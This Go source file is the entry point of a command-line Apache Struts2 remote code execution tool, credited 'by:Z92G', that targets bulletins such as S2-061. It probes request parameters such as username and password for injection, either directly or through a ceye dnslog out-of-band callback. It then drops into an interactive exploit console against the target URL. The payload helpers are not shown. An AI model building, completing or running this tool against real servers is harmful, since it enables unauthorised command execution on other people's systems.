package main

import (
	"flag"
	"fmt"
	"github.com/imroc/req/v3"
)

var pocUrl, mode, strutsNo, payload, sysType, parm string

func main() {
	hdrs := initHeaders()
	client := req.C()

	flag.StringVar(&pocUrl, "u", "http://127.0.0.1:8080", "url default http://127.0.0.1:8080")
	flag.StringVar(&mode, "m", "", "dnslog&exp")
	flag.StringVar(&strutsNo, "n", "s2-061", "defualt s2-061")
	flag.StringVar(&sysType, "s", "linux", "defualt linux")
	flag.StringVar(&parm, "p", "", "exp parm")
	flag.Parse()

	view := ` 
 ___  ____  ____  __  __  ____  ___  ___     ____   ___  ____ 
/ __)(_  _)(  _ \(  )(  )(_  _)/ __)(__ \   (  _ \ / __)( ___)
\__ \  )(   )   / )(__)(   )(  \__ \ / _/    )   /( (__  )__) 
(___/ (__) (_)\_)(______) (__) (___/(____)  (_)\_) \___)(____)  by:Z92G`
	fmt.Println(view)
	fmt.Println()

	elements := []string{"id", "name", "message", "username", "password", "LoginAccount", "LoginPwd"}

	switch mode {
	case "dnslog":
		fmt.Println("[INFO]:Checking...")
		token, types, filter, err := initCeye(1)
		if err != nil {
			fmt.Println(err)
			return
		}
		dnslog := newCeye(token, types, filter)
		ok, element, err := dnsCheck(client, hdrs, elements, dnslog, pocUrl, strutsNo, sysType)
		if err != nil {
			fmt.Println(err)
			return
		}
		if ok {
			expConsole(client, hdrs, element, pocUrl)

		}
	case "exp":
		if parm == "" {
			fmt.Println("[INFO]:Parm is null")
			return
		} else {
			expConsole(client, hdrs, parm, pocUrl)
		}
	default:
		fmt.Println("[INFO]:Checking...")
		ok, element, err := charCheck(client, hdrs, elements, pocUrl)
		if err != nil {
			fmt.Println(err)
			return
		}
		if ok {
			expConsole(client, hdrs, element, pocUrl)
		}
	}

}
